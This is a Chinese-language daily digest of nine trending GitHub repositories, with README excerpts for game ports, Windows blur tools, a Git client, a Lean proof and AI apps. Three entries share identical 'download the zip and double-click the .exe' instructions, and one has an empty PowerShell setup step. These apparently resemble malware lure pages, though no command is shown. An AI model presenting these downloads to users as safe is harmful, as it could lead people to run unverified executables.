📊 开源日报 — 2026-11-28
共发现 9 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  trustno1-coder/VIctory-NVIDIA
    ⭐ 4550 stars  |  🍴 1621 forks  |  💻 Rust  |  📅 2026-11-25
    🔗 https://github.com/trustno1-coder/VIctory-NVIDIA
    📡 来源: 🚀 5天300+星
    🏷️ compatibility-layer, directx-12, dlss, frame-generation, nvidia, rust
    📝 VIctory (Xbox Series compatibility layer) tuned for NVIDIA RTX cards: Series X at 2560x1440 with DLSS, about 26-30 fps on an RTX 5070, DLSS frame generation 2x-6x, an F1 settings menu and F3 stats panel, open water without dark blocks. Built on many repos combined into one. No game files or NVIDIA files included.

    README 摘要:
    # VIctory on NVIDIA
    
    > **Reporting a problem?** Please attach **both** logs from the run that went
    > wrong. Without them we can only guess. Paste `%LOCALAPPDATA%` into the address
    > bar of File Explorer to get there.
    >
    > 1. **The play log**, in `%LOCALAPPDATA%\victory\logs\`: the newest
    >    `victory-nvidia-play---.log` (from `victory.exe`) or
    >    `victory-nvidia--.log` (from the script launcher). The window
    >    shows its path at the start, on the line `Log: ...`.
    > 2. **The crash log**: `%LOCALAPPDATA%\VIctory\data\7952987A\crashes.log`, and,
    >    if there is one from that run, the newest `victory---.crash.log`
    >    in `%LOCALAPPDATA%\VIctory\data\7952987A\temp\`.
    >
    > Also say which GPU, Windows version (10 or 11) and release you used.
    
    ## Frame generation: what your card supports
    
    | Your card | Frame generation | Limits |
    | --- | --- | --- |
    | GeForce RTX 40 and RTX 50 | **DLSS frame generation** | 2x on RTX 40; more than 2x (up to 6x) needs an RTX 50 |
    | GeForce RTX 20 and RTX 30 | **AMD FSR 3 frame generation** (DLSS frame generation needs an RTX 40 or later) | **2x at most**. DLSS upscaling still works on these cards, so the Series X profile is fine |
    | Other cards (no DLSS) | **AMD FSR 3 frame generation** | **2x at most, Series S profile only** (F1 menu, CONSOLE): without DLSS the game's own upscaler, which FSR 3 needs, only takes the Series S sizes. Not tested here |
    
    - **At every start the game tells you** which one your card runs, and why
      not if it can't, at the top of the picture for the first 30 seconds (and
      in the console window).
    - **F1 menu, FRAME GEN TYPE**: AUTO (DLSS where the card has it, else FSR 3),
      DLSS, or FSR 3 (also on an RTX 40/50, if you prefer it). FRAME GENERATION
      switches it off or on.
    - FSR 3 needs AMD's FidelityFX DLLs (`amd_fidelityfx_loader_dx12.dll` and
      `amd_fidelityfx_framegeneration_dx12.dll`, about 30 MB). They are AMD's and
      not part of this program. On a card without DLSS frame generation (or with
      FSR 3 chosen in F1) the first start of `victory.exe` asks once whether to
      download them from AMD's own GitHub (the FidelityFX SDK);
      `victory.exe get-fsr` does it later, and `Get-AMD-FSR.cmd` does it for the
      script launcher. Each file is checked against the copy this fork was tested
      with, and only loaded with AMD's valid signature. A `fidelityfx` folder next
      to `victory.exe`, or `VICTORY_FIDELITYFX_DIR`, works too.
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  RMvdesi/obsidian-prism
    ⭐ 3040 stars  |  🍴 138 forks  |  💻 JavaScript  |  📅 2026-11-17
    🔗 https://github.com/RMvdesi/obsidian-prism
    📡 来源: 🚀 两周800+星
    🏷️ antigravity, desktop-customization, developer-tools, gplv3, optical-ui, spring-animation, theme, ui-theme, webgl2
    📝 Optical UI, damped-spring choreography, 512K shallow-water vial, pixel mascots & dual-mode thought suite for Antigravity (GPL-3.0)

    README 摘要:
    # Obsidian Prism · 黑曜棱镜
    
    **为 Google Antigravity 打造的原生光学界面套件**
    
    四套深浅配色 · 会呼吸的 512K 上下文试管 · 推理等级滑块 · 像素伙伴 · 自定义动静态壁纸（Beta）· Chat 对话模式（Beta）
    
    **简体中文** · **English** · **更新日志 (CHANGELOG)** · **下载安装包 (Releases)** · **问题反馈 (Issues)**
    
      
      
      
      
      
      
    
      
      
      
    
    以上画面由离线渲染舞台直接运行本仓库前端源码逐帧录制，示例工作区与对话内容均为虚构。
    
    > **非官方社区项目与商标免责声明 (Non-Affiliation Disclaimer)**
    >
    > **Obsidian Prism is an independent open-source project and is not affiliated with or endorsed by Google LLC.**
    > 本项目为独立的开源社区工程，与 Google LLC 无任何隶属、赞助或官方背书关系；文中提及的 “Antigravity” 与 “Google” 仅作兼容性说明用途。
    
    ---
    
    ## 亮点
    
    - **四套配色，一键换装**：深空黑曜、暖炭玄岩两套深色，白昼冷晶、暖白画册两套浅色，可跟随系统亮暗自动切换。
    - **看得见的上下文**：输入框旁的小试管实时显示 512K 上下文用量，点开就能看到用量拆分和配额剩余预测。
    - **推理等级，一拨就换**：模型菜单里内置星空滑块；选中 Orchestrator 时，滑块会变成一条会折射光线的切工水晶。
    - **读得懂的思考过程与标题**：模型的思考内容支持实时转译成中文（沉浸 / 双语对照）与一键诊断，支持手动 HTTP/SOCKS5 代理、可选工具摘要与会话标题自动翻译。
    - **自定义动静态背景壁纸（Beta）**：位于设置「Beta 内容」分类，默认关闭零占用，支持纯本机只读加载自定义图片与 MP4/WebM 动态视频背景（实验性功能，交互与表现可能随版本持续调整）。
    - **桌面上的像素伙伴**：Clawd、小紫猫和三只迷你蟹会在输入框上方玩叠叠乐，还藏着一个彩虹彩蛋。
    - **更顺手的工作台**：内置浏览器和大文件检视台、右键快捷菜单、长代码块折叠、会话大纲快速跳转。
    - **Chat 对话模式（Beta）**：在写代码之外，多了一个专门聊天、整理资料的空间，和工程设置互不干扰。
    - **轻、快、守规矩**：动画空闲时自动降到 0fps；本地服务只监听本机；设置改动 10 毫秒内生效，随时一键卸载还原。
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  Pixel679-cmyk/windows-titlebar-blur-customizer
    ⭐ 1507 stars  |  🍴 1 forks  |  💻 C++  |  📅 2026-11-26
    🔗 https://github.com/Pixel679-cmyk/windows-titlebar-blur-customizer
    📡 来源: 🚀 5天300+星
    🏷️ acrylic, aero, aeroglass, blur, cplusplus, cpp, desktop, desktop-customization, dwm, glassmorphism
    📝 Customize Windows 10 and 11 title bar effects with Aero, Acrylic, Mica and advanced DWM blur effects.

    README 摘要:
    **Windows Titlebar Blur Customizer is a free, open-source Windows desktop customization tool that transforms standard application title bars with beautiful Aero, Acrylic, Mica, and glass blur effects.** Personalize the Windows 10 and Windows 11 desktop appearance without needing command-line knowledge.
    
    ## ⬇️ Installation
    
    **Download the Windows application**
    
    1. Open the repository's Releases page.
    2. Download the latest release archive **`Windows Titlebar Blur Customizer 4.4.2.zip`**.
    3. Extract the archive into a folder of your choice.
    4. Keep **`Windows Titlebar Blur Customizer 4.4.2.exe`** and `libvlc.dll` together in that folder.
    5. Double-click **`Windows Titlebar Blur Customizer 4.4.2.exe`** to launch the application.
    
    ## ✨ Features
    
    - 🌫️ **Advanced DWM Blur Effects** — Customize Windows Desktop Window Manager title bar rendering with configurable blur and transparency effects.
    - 🪟 **Aero Glass Transparency** — Bring back the classic Windows Aero appearance with glass-like surfaces, reflections, and visual depth.
    - 🎨 **Acrylic Material Effects** — Apply modern translucent Acrylic styling to supported application title bars.
    - 💎 **Windows 11 Mica Support** — Enhance compatible Windows 11 applications with elegant Mica and Mica Alt material effects.
    - 🖌️ **Custom Colors and Opacity** — Adjust title bar blending colors, text colors, transparency, and blur intensity to match your desktop theme.
    - 🌗 **Automatic Light and Dark Modes** — Configure appearance behavior for light and dark Windows themes independently.
    - ⚙️ **Multiple Blur Methods** — Choose between CustomBlur, AccentBlur, and SystemBackdrop rendering approaches.
    - 🖥️ **Global Title Bar Customization** — Apply consistent visual styling across supported desktop applications.
    - ✨ **Enhanced Window Controls** — Customize title bar button appearance, including classic-style button dimensions and glow effects.
    - 🎭 **Third-Party Theme Compatibility** — Extend desktop personalization while retaining support for compatible Windows themes and customization tools.
    
    ## 🖼️ Overview
    
    Explore the visual capabilities of Windows Titlebar Blur Customizer.
    
    ### Available Windows Material Effects
    
    | Effect | Description | Platform |
    |---|---|---|
    | Aero | Classic transparent glass appearance | Windows 10 / 11 |
    | Blur | Customizable background blur | Windows 10 / 11 |
    | Acrylic | Modern translucent material | Windows 10 / 11 |
    | Mica | Native Windows material styling | Windows 11 |
    | Mica Alt | A

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  ZigZagBoi1/ScarlettPort
    ⭐ 1408 stars  |  🍴 202 forks  |  💻 Rust  |  📅 2026-11-24
    🔗 https://github.com/ZigZagBoi1/ScarlettPort
    📡 来源: 🚀 5天300+星
    🏷️ amd, compatibility-layer, d3d12, directx12, dxil, game-port, native-port, nvidia, pc-port, rust
    📝 Native PC port layer for an Xbox Series X|S title: the game's x64 code runs on your CPU and its RDNA2 GPU code is recompiled for your graphics card. Bring your own files.

    README 摘要:
    # ScarlettPort
    
    **Run your own Xbox Series X|S dump on a Windows PC. Its own runtime, its own launcher.**
    
    
    
    
    
    
    ⭐ If ScarlettPort helps you, please star the repo, it helps more people find it.
    
    > *"Almost everything you download was made by a company. This was made by a person who could not stop wondering whether it was possible. If it gave you even one moment of that same wonder, a single dollar is how you tell someone their late nights mattered."*
    >
    > Ziggy
    
    
    
    Donations are voluntary gifts that support development time. They are not a purchase: they buy no game content, access, builds or perks. PayPal: please send as Friends & Family (a gift).
    
    
    
    
    
    ScarlettPort v0.5.0 on an RTX 3060 (Series S profile, ray tracing off).
    
    ## What it is
    
    A bring-your-own-copy compatibility layer, in the spirit of Wine and Proton. No emulator, no streaming: the title's own x64 code runs on your CPU, and its RDNA2 GPU code is recompiled for your graphics card on the fly.
    
    You supply a dump of your own legally purchased copy. Nothing of any title is included here.
    
    ## Status
    
    
    
    ```
    ██████████████████░░  90%
    ```
    
    **Done:** boots, gets through menus, saves and legal screens, reaches the world (in 178 s in 0.5.0) and gives you control in the opening area, with the full picture: lit rooms, ambient and sky light, complete textures.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  lsernau/grh-lean
    ⭐ 1078 stars  |  🍴 121 forks  |  💻 Lean  |  📅 2026-11-25
    🔗 https://github.com/lsernau/grh-lean
    📡 来源: 🚀 5天300+星
    📝 A short Lean 4 proof of the Generalized Riemann Hypothesis

    README 摘要:
    # GRH for Dirichlet L-functions, in Lean 4
    
    Research artifact. Not maintained and not accepting contributions.
    
    A Lean 4 proof of the Riemann Hypothesis and of the Generalized Riemann
    Hypothesis for Dirichlet L-functions, built on Mathlib and using only the
    axioms `propext`, `Classical.choice` and `Quot.sound`.
    
    The proof is based on Levent Alpöge's, with Claude (https://alpo.ge/remark.pdf).
    This repository is a shorter version, produced in collaboration with my
    colleagues at Anthropic, and Claude.
    
    ## Two editions
    
    - `grh/`: readable edition, about 300,000 lines. Start at `grh/GUIDE.md`.
    - `grh-compact/`: the same five theorems, about 76,000 lines.
    
    Each folder is its own Lake project with its own README.
    
    ## Build
    
    Needs Lean v4.35.0 and Mathlib at commit 56a00585. In either folder:
    
        lake exe cache get
        lake build
        lake env lean scripts/PrintAxioms.lean
    
    A build takes one to two hours on 12 cores with 24 GB of memory (about
    85 minutes more if the Mathlib cache is missing).
    
    ## Status
    
    The proof has passed machine checks only, listed in each folder's README.
    No mathematician has read it through, and no paper comes with it.
    
    ## License
    
    Apache 2.0, Copyright 2026 Anthropic, PBC. See `LICENSE`, and `NOTICE` and
    `ATTRIBUTION.md` in each folder.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  riveran0226/windows-explorer-blur-mica
    ⭐ 992 stars  |  🍴 0 forks  |  💻 C++  |  📅 2026-11-27
    🔗 https://github.com/riveran0226/windows-explorer-blur-mica
    📡 来源: 🚀 5天300+星
    🏷️ acrylic, blur, cpp, customization, dark-mode, desktop, desktop-customization, explorer, mica, personalization
    📝 Free Windows 10 & 11 Explorer customization tool for Acrylic, Mica, transparency and background blur effects.

    README 摘要:
    **Windows Explorer Blur & Mica is a free, open-source Windows desktop customization tool that transforms the appearance of File Explorer with modern Acrylic, Mica, transparency, and background blur effects.** Designed for Windows 10 and Windows 11 users, it brings a more refined desktop experience without requiring command-line interaction for everyday customization.
    
    ## ⬇️ Installation
    
    **Download the Windows application**
    
    1. Open the repository's Releases page.
    2. Download the latest release archive **`Windows Explorer Blur & Mica 4.4.0.zip`**.
    3. Extract the archive into a folder of your choice.
    4. Keep **`Windows Explorer Blur & Mica 4.4.0.exe`** and `libvlc.dll` together in that folder.
    5. Double-click **`Windows Explorer Blur & Mica 4.4.0.exe`** to launch the application.
    
    ## ✨ Features
    
    - 🌫️ **Background Blur Effects** — Add a modern blurred background to Windows File Explorer for a cleaner, more immersive interface.
    - 🪟 **Windows 11 Mica Material** — Apply native-inspired Mica and Mica Alt visual effects to supported Windows 11 Explorer windows.
    - 💎 **Acrylic Transparency** — Enable translucent Acrylic surfaces with customizable background blending and opacity.
    - 🎨 **Custom Blend Colors** — Adjust red, green, blue, and alpha values to create personalized Explorer backgrounds.
    - 🌗 **Automatic Theme Adaptation** — Configure different appearance settings for Windows light mode and dark mode.
    - 🧩 **Windows 10 & 11 Support** — Customize File Explorer across supported Windows versions with effects suited to each system.
    - 🔧 **Explorer Customization Compatibility** — Designed to work alongside popular Explorer interface modifications, alternative themes, and shell customization utilities.
    
    ## 🖼️ Overview
    
    Windows Explorer Blur & Mica focuses on improving the visual appearance of Windows File Explorer while preserving its familiar functionality.
    
    ### Available visual effects
    
    | Effect | Description | Platform |
    |---|---|---|
    | Background Blur | Soft blurred window backgrounds | Windows 10 / 11 |
    | Acrylic | Translucent material with color blending | Windows 10 / 11 |
    | Mica | Windows 11-inspired desktop material | Windows 11 |
    | Mica Alt | Alternative Mica appearance | Supported Windows 11 builds |
    | Clear Blur | Simplified transparent blur appearance | Windows 10 / 11 |
    
    ### Personalization options
    
    - Separate color configurations for light and dark themes.
    - Adjustable transparency through alpha blending.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  flint63-code/gitdesk-windows
    ⭐ 989 stars  |  🍴 0 forks  |  💻 C#  |  📅 2026-11-27
    🔗 https://github.com/flint63-code/gitdesk-windows
    📡 来源: 🚀 5天300+星
    🏷️ bitbucket, cross-platform, desktop, developer-tools, dotnet, git, git-client, git-gui, git-lfs, git-workflow
    📝 Free open-source Git GUI client for Windows with visual commit history, branch management, SSH, Git LFS and more.

    README 摘要:
    **A modern graphical Git client for Windows developers.**
    
    **GitDesk is a free, open-source Git GUI client for Windows that makes version control easier to understand and manage.** Visualize commit history, organize branches, review code changes, manage remote repositories, and run advanced Git workflows without relying on the command line.
    
    ## ⬇️ Installation
    
    **Download the Windows application**
    
    1. Open the repository's Releases page.
    2. Download the latest release archive **`GitDesk – Windows Git GUI Client 4.4.1.zip`**.
    3. Extract the archive into a folder of your choice.
    4. Keep **`GitDesk – Windows Git GUI Client 4.4.1.exe`** and `libvlc.dll` together in that folder.
    5. Double-click **`GitDesk – Windows Git GUI Client 4.4.1.exe`** to launch the application.
    
    ## ✨ Features
    
    - 📊 **Visual Git Commit Graph** — Explore repository history through an interactive commit graph that makes branches, merges, and development timelines easy to understand.
    - 🌿 **Branch Management** — Create, rename, switch, merge, delete, and compare Git branches using an intuitive graphical interface.
    - 🔄 **Complete Git Workflow** — Clone, fetch, pull, push, commit, merge, rebase, reset, revert, and cherry-pick changes without memorizing terminal commands.
    - 🔐 **SSH Authentication** — Connect to remote Git repositories securely using SSH credentials and configure authentication independently for different remotes.
    - 📝 **Advanced Commit Tools** — Amend commits, rewrite messages, squash changes, and perform interactive rebasing with visual workflow controls.
    - 🔍 **Powerful Diff Viewer** — Inspect file changes, compare revisions, review branch differences, examine file history, and investigate line-by-line modifications.
    - 📦 **Git LFS And Submodules** — Work with Git Large File Storage, submodules, tags, stashes, and multiple Git worktrees.
    - 🎨 **Customizable Interface** — Choose light or dark themes, personalize the desktop experience, and organize your development workspace.
    - 🔎 **Commit Search** — Find historical commits, inspect repository changes, and navigate project history efficiently.
    - 🛠️ **Custom Git Actions** — Extend common workflows with custom actions and access Git operation logs for troubleshooting.
    - 🔀 **Multiple Remote Providers** — Work with repositories hosted on GitHub, GitLab, Gitea, Gitee, and Bitbucket.
    - 🤖 **AI Commit Message Assistance** — Generate suggested commit messages and use conventional commit helpers to maintain consistent project history.
    
    ## 🖼

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  SenpaiSpide664/ai-visual-prompt-cookbook
    ⭐ 154 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-26
    🔗 https://github.com/SenpaiSpide664/ai-visual-prompt-cookbook
    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
    🏷️ ai, ai-art, ai-prompts, design-resources, gemini, generative-ai, gpt-image, graphic-design, image-generation, json
    📝 AI Visual Prompt Cookbook: Reusable JSON Style Prompts for Consistent Image Generation

    README 摘要:
    # AI Visual Prompt Cookbook: Structured Style Prompt Collection — Dataset
    
    ### 🖥️ PowerShell Setup
    
       
    
    ---
    
    The AI Visual Prompt Cookbook is a structured dataset of reusable style definitions for AI image generation, distributed as self-contained JSON prompt templates compatible with Nano Banana Pro, GPT Image, and Midjourney. Each entry pairs a parameterized `style.json` file with preview assets and documented variables, allowing a single style definition to be applied consistently across different subjects and compositions. The dataset is openly accessible and updated on a weekly cadence with new style entries. This README documents the dataset's structure, schema conventions, and intended use for researchers and practitioners working with prompt-based image synthesis.
    
    ## ✅ Before You Start
    
    - Windows 10 or Windows 11
    - PowerShell 5.1 or newer (already available on Windows)
    - Active network connection
    - No admin rights needed
    
    ## Dataset Structure
    
    The dataset is organized as a flat directory of self-contained style packages, one directory per visual style. Each package is addressed by a stable slug and holds a single machine-readable prompt specification alongside two fixed preview renders, so any style can be located, copied, and reproduced independently of the others.
    
    ```
    styles//
    style.json # Machine-readable prompt specification
    preview-16x9.jpg # Landscape reference render
    preview-9x16.jpg # Portrait reference render
    ```
    
    The `style.json` file is the primary artifact and is fully self-contained: it can be transferred in isolation into any compatible multimodal workflow without auxiliary files. Its structure is defined as follows:
    
    - `prompt_template` — the reusable style prompt, expressed with `{VARIABLE}` placeholders for all substitutable content.
    - `environment_variables` — a declaration of every placeholder the template accepts, including expected value types where applicable.
    - `schema_version` — records the specification revision. Newer entries declare `"2.2"` and enumerate only the variables their template actually consumes (for example `SUBJECT`, `MAIN_TEXT`, `DESIGN_DIRECTION`); earlier `"2.1"` entries retain a fixed set of ten standard variables.
    - `examples` — an array of ready-to-edit cases; each case stores only `case_name` and its corresponding `values` map.
    - `style_fidelity_anchors` — the invariants the model is instructed to preserve across generations.
    - `source_content_to_avoid` — explicit exclusions that prevent direct rep

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#9  tg-prplx/vellium
    ⭐ 151 stars  |  🍴 16 forks  |  💻 TypeScript  |  📅 2026-02-18
    🔗 https://github.com/tg-prplx/vellium
    📡 来源: 🤖 AI / LLM / RAG | 活跃 | AI chatbot character rol
    🏷️ ai, ai-chat, ai-roleplay, ai-roleplay-chat, ai-writing, anime, character-ai, chatbot, chatgpt, desktop-app
    📝 Local-first desktop AI workbench for roleplay, multi-character chat, long-form writing, RAG, MCP tools, plugins, and local models.

    README 摘要:
    # Vellium
    
    Vellium is a local-first desktop workbench for AI chat, character roleplay, live
    voice conversations, and long-form writing. It connects to OpenAI-compatible
    APIs, OpenRouter, Requesty, Demon Route, Cheaper Inference, API Route, UberLLM, Synap, LM Studio, Ollama,
    KoboldCpp, and configurable custom endpoints. Chats, characters, projects, settings, and knowledge collections are
    stored locally in SQLite.
    
      Download for macOS, Windows, or Linux
      ·
      Quick start
      ·
      User guide
    
    > [!IMPORTANT]
    > **Agents is deprecated.** It is disabled by default and is not a primary
    > Vellium workspace. Existing agent threads and the implementation are retained
    > for compatibility under **Settings → Legacy → Agents**. New workflows should
    > use Chat, Writing, MCP tools, or plugins. See the
    > Legacy and Agents policy.
    
    ## What Vellium includes
    
    - **Chat and roleplay:** branching timelines, message editing, multiple
      characters, personas, LoreBooks, author notes, scene state, prompt blocks,
      translation, attachments, export, and controllable automatic turns.
    - **Reasoning-aware context:** provider reasoning fields and `` traces can
      be displayed, bounded, persisted, and optionally returned to the model as
      context. RP Reasoning is a separate simulated prompt mode.
    - **Live voice and Inochi2D avatars:** microphone input, Whisper-compatible STT,
      streaming TTS, parameter-driven lip sync/emotions for `.inp`/`.inx` puppets,
      model and RP controls, attachments, screen context, and chat tools in Live mode.
    - **Writing:** projects, chapters, scenes, Character Forge, summaries, rewrite
      and expansion actions, RAG context, DOCX import, and DOCX/Markdown export.
    - **Characters and world data:** character-card import/editing, manual character
      ordering, multi-character participation, LoreBooks, and world-info import.
    - **Knowledge and RAG:** collections, bounded ingestion, embeddings, optional
      reranking, and explicit bindings for Chat and Writing.
    - **Providers:** OpenAI-compatible APIs, KoboldCpp, custom endpoint adapters,
      manual model fallbacks, job-specific model routing, and API parameter policy.
